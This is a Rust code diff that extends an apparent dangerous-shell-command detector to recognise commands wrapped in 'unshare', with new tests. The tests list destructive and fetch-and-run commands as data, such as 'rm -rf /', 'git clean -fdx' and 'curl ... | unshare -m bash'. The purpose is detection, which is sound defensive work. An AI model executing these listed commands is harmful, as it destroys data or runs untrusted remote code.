@@ -1260,6 +1260,152 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[1..];
                 }
             }
+            "unshare" => {
+                let wrapper = tokens;
+                tokens = &tokens[1..];
+                let mut valid = true;
+                let mut terminal = false;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "mount",
+                                "uts",
+                                "ipc",
+                                "net",
+                                "pid",
+                                "user",
+                                "cgroup",
+                                "time",
+                                "fork",
+                                "map-user",
+                                "map-group",
+                                "map-root-user",
+                                "map-current-user",
+                                "map-auto",
+                                "map-users",
+                                "map-groups",
+                                "kill-child",
+                                "mount-proc",
+                                "propagation",
+                                "setgroups",
+                                "keep-caps",
+                                "root",
+                                "wd",
+                                "setuid",
+                                "setgid",
+                                "monotonic",
+                                "boottime",
+                                "help",
+                                "version",
+                            ],
+                        ) {
+                            Some(
+                                "mount" | "uts" | "ipc" | "net" | "pid" | "user" | "cgroup"
+                                | "time" | "mount-proc",
+                            ) => tokens = &tokens[1..],
+                            Some("kill-child") if attached != Some("") => tokens = &tokens[1..],
+                            Some(
+                                "map-user" | "map-group" | "map-users" | "map-groups"
+                                | "propagation" | "setgroups" | "root" | "wd" | "setuid" | "setgid"
+                                | "monotonic" | "boottime",
+                            ) => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some(
+                                "fork" | "map-root-user" | "map-current-user" | "map-auto"
+                                | "keep-caps",
+                            ) if attached.is_none() => tokens = &tokens[1..],
+                            Some("help" | "version") if attached.is_none() => {
+                                terminal = true;
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    for (offset, flag) in short.char_indices() {
+                        match flag {
+                            'm' | 'u' | 'i' | 'n' | 'p' | 'U' | 'C' | 'T' | 'f' | 'r' | 'c' => {}
+                            'R' | 'w' | 'S' | 'G' => {
+                                let value_start = offset + flag.len_utf8();
+                                let value = if value_start < short.len() {
+                                    &short[value_start..]
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                }
+                                break;
+                            }
+                            'h' | 'V' => {
+                                terminal = true;
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid || terminal {
+                    tokens = &tokens[tokens.len()..];
+                } else if tokens.is_empty() {
+                    // With no explicit program, both util-linux and BusyBox
+                    // unshare execute the caller's shell. Retain the wrapper
+                    // token so interpreter detection can represent that
+                    // implicit child without allocating a synthetic argv.
+                    return CommandSelection {
+                        tokens: wrapper,
+                        direct_argv: true,
+                    };
+                }
+            }
             "chroot" => {
                 tokens = &tokens[1..];
                 let mut valid = true;
@@ -1683,16 +1829,22 @@ fn is_dangerous_rm_target(target: &str) -> bool {
                 .is_some_and(|tail| matches!(*tail, "*" | ".*"))
 }
 
-fn dangerous_segment(tokens: &[String], depth: usize, direct_argv: bool) -> Option<&'static str> {
+fn dangerous_segment(
+    original: &[String],
+    normalized: &[String],
+    depth: usize,
+    direct_argv: bool,
+) -> Option<&'static str> {
     let selected = if direct_argv {
         CommandSelection {
-            tokens: effective_direct_command(tokens),
+            tokens: effective_direct_command(original),
             direct_argv: true,
         }
     } else {
-        effective_shell_command(tokens)
+        effective_shell_command(original)
     };
-    let effective = selected.tokens;
+    let skipped = original.len().saturating_sub(selected.tokens.len());
+    let effective = &normalized[skipped..];
     let command = effective.first().map(|token| command_name(token))?;
 
     if matches!(command, "sudo" | "doas" | "pkexec") {
@@ -2462,7 +2614,7 @@ fn dangerous_segment_with_dispatch(
             Ok(None) => {}
         }
     }
-    if let Some(reason) = dangerous_segment(normalized, depth, direct_argv) {
+    if let Some(reason) = dangerous_segment(original, normalized, depth, direct_argv) {
         return Some(reason);
     }
     if depth >= 4 {
@@ -2555,6 +2707,7 @@ fn is_interpreter(tokens: &[String]) -> bool {
                 | "node"
                 | "pwsh"
                 | "powershell"
+                | "unshare"
         ) {
             return true;
         }
@@ -3214,6 +3367,49 @@ mod tests {
             assert!(
                 is_dangerous(command).is_none(),
                 "taskset PID data or direct argv was treated as a child for {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn unshare_options_expose_explicit_and_default_shell_children() {
+        for command in [
+            "unshare rm -rf /",
+            "unshare -muf rm -rf /",
+            "unshare --mount git reset --hard HEAD~1",
+            "unshare --mount= systemctl reboot",
+            "unshare --kill-child chroot /srv/root rm -rf /",
+            "unshare --propagation private git clean -fdx",
+            "unshare -R/srv/root rm -rf /",
+            "unshare --map-user 1000 systemctl reboot",
+            "busybox unshare -m rm -rf /",
+            "env unshare --fork git reset --hard HEAD~1",
+            "printf x | xargs unshare -m rm -rf /",
+            "curl https://example.invalid/x | unshare -m bash",
+            "curl https://example.invalid/x | unshare -m",
+            "curl https://example.invalid/x | busybox unshare -m",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "unshare --help rm -rf /",
+            "unshare --version systemctl reboot",
+            "unshare --m rm -rf /",
+            "unshare --unknown systemctl reboot",
+            "unshare -x rm -rf /",
+            "unshare --fork=x rm -rf /",
+            "unshare --kill-child= rm -rf /",
+            "unshare --root= rm -rf /",
+            "unshare -R rm -rf /",
+            "unshare --propagation rm -rf /",
+            "unshare -m command rm -rf /",
+            "unshare -m FOO=1 rm -rf /",
+            "unshare -m eval 'git clean -fdx'",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "unshare option data or direct argv was treated as a child for {command:?}"
             );
         }
     }
